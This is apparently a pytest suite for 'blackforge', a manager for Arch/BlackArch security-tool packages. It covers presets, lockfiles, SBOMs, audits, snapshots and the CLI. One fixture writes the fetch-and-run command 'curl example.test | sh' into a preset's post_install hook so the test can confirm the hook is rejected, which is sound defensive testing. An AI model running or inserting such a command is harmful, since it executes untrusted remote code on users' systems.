from __future__ import annotations

import json
from pathlib import Path

import pytest

from blackforge import audit as audit_module
from blackforge import cli
from blackforge import snapshots as snapshots_module
from blackforge.audit import _outdated, _vulnerabilities
from blackforge.aur import AurError, _normalize
from blackforge.backend import CommandResult
from blackforge.catalog import bundled_catalog
from blackforge.community import (
    CommunityPresetError,
    bundled_community_presets,
    read_community_preset,
)
from blackforge.dashboard import build_dashboard
from blackforge.integrations import write_systemd_units
from blackforge.lockfiles import compare_lock, read_lock, sbom_from_lock
from blackforge.maintenance import load_bundled_maintenance
from blackforge.snapshots import (
    SnapshotStatus,
    create_snapshot,
    pacman_cache_rollback_plan,
)


def test_bundled_community_presets_are_reviewed_and_resolvable() -> None:
    presets = bundled_community_presets()
    assert {item.id for item in presets} == {
        "defensive-web-audit",
        "forensics-basics",
        "network-observation",
    }
    assert all(item.reviewed and item.resolved_packages() for item in presets)


def test_community_preset_rejects_executable_fields(tmp_path: Path) -> None:
    path = tmp_path / "unsafe.json"
    path.write_text(
        json.dumps(
            {
                "schema_version": 1,
                "id": "unsafe-preset",
                "name": "Unsafe",
                "description": "Contains a forbidden hook.",
                "authors": ["@octocat"],
                "tags": ["web"],
                "packages": ["blackarch:amass"],
                "license": "CC0-1.0",
                "reviewed": False,
                "post_install": "curl example.test | sh",
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(CommunityPresetError, match="data-only|unsupported"):
        read_community_preset(path)


def test_community_preset_requires_source_qualified_packages(tmp_path: Path) -> None:
    path = tmp_path / "unqualified.json"
    path.write_text(
        json.dumps(
            {
                "schema_version": 1,
                "id": "unqualified",
                "name": "Unqualified",
                "description": "Package source is intentionally missing.",
                "authors": ["@octocat"],
                "tags": ["web"],
                "packages": ["amass"],
                "license": "CC0-1.0",
                "reviewed": False,
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(CommunityPresetError, match="unqualified"):
        read_community_preset(path)


def _lock_value() -> dict[str, object]:
    return {
        "$schema": "test",
        "schema_version": 1,
        "packages": [
            {
                "ref": "arch:extra/nmap",
                "name": "nmap",
                "version": "7.97-1",
                "source": "arch",
                "repository": "extra",
                "sha256": "a" * 64,
            }
        ],
    }


def test_lockfile_validation_compare_and_sbom(tmp_path: Path) -> None:
    path = tmp_path / "blackforge.lock.json"
    path.write_text(json.dumps(_lock_value()), encoding="utf-8")
    value = read_lock(path)
    assert compare_lock(value, {"nmap": "7.97-1"})["matches"] is True
    drift = compare_lock(value, {"nmap": "7.96-1"})
    assert drift["matches"] is False
    assert drift["version_drift"][0]["installed_version"] == "7.96-1"
    cyclonedx = sbom_from_lock(value, "cyclonedx")
    spdx = sbom_from_lock(value, "spdx")
    assert cyclonedx["bomFormat"] == "CycloneDX"
    assert cyclonedx["components"][0]["hashes"][0]["content"] == "a" * 64
    assert spdx["spdxVersion"] == "SPDX-2.3"


def test_cache_rollback_never_executes_and_reports_missing(tmp_path: Path) -> None:
    archive = tmp_path / "nmap-7.97-1-x86_64.pkg.tar.zst"
    archive.write_bytes(b"signed-package-placeholder")
    plan = pacman_cache_rollback_plan(
        {"nmap": "7.97-1", "amass": "4.2.0-1"},
        cache=tmp_path,
    )
    assert plan["complete"] is False
    assert plan["archives"] == [str(archive)]
    assert plan["missing"] == [{"name": "amass", "version": "4.2.0-1"}]
    assert plan["command"][:4] == ["sudo", "pacman", "-U", "--"]


class _Runner:
    def __init__(self, result: CommandResult) -> None:
        self.result = result
        self.calls: list[list[str]] = []

    def run(self, args, **_kwargs):
        self.calls.append(list(args))
        return self.result


def test_security_audit_parses_pacman_and_arch_audit_json(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    pacman = _Runner(
        CommandResult(
            ["pacman", "-Qu"],
            0,
            stdout="nmap 7.96-1 -> 7.97-1\n",
        )
    )
    assert _outdated(pacman)[0] == {
        "name": "nmap",
        "installed": "7.96-1",
        "available": "7.97-1",
    }

    monkeypatch.setattr(audit_module.shutil, "which", lambda name: f"/usr/bin/{name}")
    helper = _Runner(
        CommandResult(
            ["arch-audit", "--json"],
            1,
            stdout=json.dumps(
                {"nmap": {"severity": "high", "cves": ["CVE-TEST-1"]}}
            ),
        )
    )
    vulnerable, metadata = _vulnerabilities(helper)
    assert vulnerable[0]["package"] == "nmap"
    assert metadata == {
        "available": True,
        "source": "security.archlinux.org",
        "count": 1,
    }


def test_aur_normalization_is_metadata_only() -> None:
    value = _normalize(
        {
            "Name": "example-git",
            "Version": "1.0.r1-1",
            "Maintainer": "octocat",
            "NumVotes": 42,
            "Popularity": 1.5,
            "FirstSubmitted": 1_700_000_000,
            "LastModified": 1_800_000_000,
        }
    )
    assert value["metadata_only"] is True
    assert value["url"] == "https://aur.archlinux.org/packages/example-git"
    assert "PKGBUILD" not in value


def test_systemd_generation_uses_the_selected_executable(tmp_path: Path) -> None:
    service, timer = write_systemd_units(
        tmp_path,
        executable="/home/test user/.local/bin/blackforge",
    )
    service_text = service.read_text(encoding="utf-8")
    assert 'ExecStart="/home/test user/.local/bin/blackforge" updates check' in service_text
    assert "OnCalendar=weekly" in timer.read_text(encoding="utf-8")
    assert "enable" not in service_text


def test_snapshot_plan_never_calls_mutating_runner(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        snapshots_module,
        "snapshot_status",
        lambda _runner=None: SnapshotStatus(True, True, True, True),
    )
    runner = _Runner(CommandResult([], 0, stdout="17\n"))
    planned = create_snapshot("Before test", apply=False, runner=runner)
    assert planned.planned is True
    assert runner.calls == []

    applied = create_snapshot("Before test", apply=True, runner=runner)
    assert applied.stdout == "17\n"
    assert runner.calls and "snapper" in runner.calls[0]


def test_dashboard_is_portable_and_script_free(tmp_path: Path) -> None:
    output = tmp_path / "report.html"
    result = build_dashboard(
        output,
        bundled_catalog(),
        load_bundled_maintenance(required=True),
    )
    text = output.read_text(encoding="utf-8")
    assert result["output"] == str(output)
    assert "Maintenance dashboard" in text
    assert "<script" not in text


def test_cli_community_plan_is_read_only(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setattr(cli.PacmanBackend, "supported", property(lambda _self: False))
    monkeypatch.setattr(
        cli.PacmanBackend,
        "install",
        lambda *_args, **_kwargs: pytest.fail("plan-only community command installed packages"),
    )
    assert cli.run(["community", "apply", "network-observation", "--json"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["operation"] == "install"
    assert "extra/nmap" in payload["requested"]


def test_cli_aur_requires_explicit_opt_in() -> None:
    with pytest.raises(AurError, match="opt-in"):
        cli.run(["aur", "search", "nmap"])


def test_turkish_quick_help_is_available_without_catalog(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setattr(cli, "load_catalog", lambda *_args: pytest.fail("help loaded catalog"))
    assert cli.run(["help", "--lang", "tr"]) == 0
    assert "Turkce yardim" in capsys.readouterr().out
